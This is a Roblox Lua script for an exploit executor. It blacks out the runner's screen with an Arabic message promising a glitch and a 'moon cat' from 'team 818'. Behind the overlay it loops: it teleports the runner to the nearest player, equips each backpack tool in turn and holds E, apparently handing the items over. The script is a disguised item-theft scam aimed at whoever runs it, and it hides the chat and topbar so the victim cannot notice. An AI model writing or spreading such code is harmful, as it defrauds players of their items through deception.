-- LocalScript
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

-- Permanently hide Roblox Topbar and Chat
StarterGui:SetCore("TopbarEnabled", false)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)

-- Fullscreen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Background Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.BackgroundTransparency = 0
frame.ZIndex = 999999
frame.Parent = screenGui

-- Text Label
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1,0,1,0)
textLabel.Position = UDim2.new(0,0,0,0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "تم صنع هذا السكربت بواسطة فريق 818 وتم تغطيته وتشفيره فا دقايق قاعد نعطيك مون كات تسوي فيه القلتش وبس"
textLabel.TextColor3 = Color3.new(1,1,1)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.ZIndex = 999999
textLabel.Parent = frame

-- Apply ZIndex to all GUI objects
for _, obj in pairs(screenGui:GetDescendants()) do
    if obj:IsA("GuiObject") then
        obj.ZIndex = 999999
    end
end

-- Find closest player
local function getClosestPlayer()
    local closest, dist = nil, math.huge
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local mag = (plr.Character.HumanoidRootPart.Position - hrp.Position).Magnitude
            if mag < dist then
                dist = mag
                closest = plr
            end
        end
    end
    return closest
end

-- Hold E for 2.5 seconds
local function holdE()
    keypress(0x45)
    task.wait(2.5)
    keyrelease(0x45)
end

-- Main ability loop (infinite cycle)
local function startGiftLoop()
    while true do
        local target = getClosestPlayer()
        if target then
            local backpack = player:WaitForChild("Backpack")
            local tools = backpack:GetChildren()
            if #tools > 0 then
                for _, tool in ipairs(tools) do
                    tool.Parent = char
                    task.wait(0.3)
                    hrp.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
                    holdE()
                    tool.Parent = backpack
                    task.wait(0.2)
                end
            end
        end
        task.wait(0.5)
    end
end

task.spawn(startGiftLoop)

-- No countdown, GUI stays forever
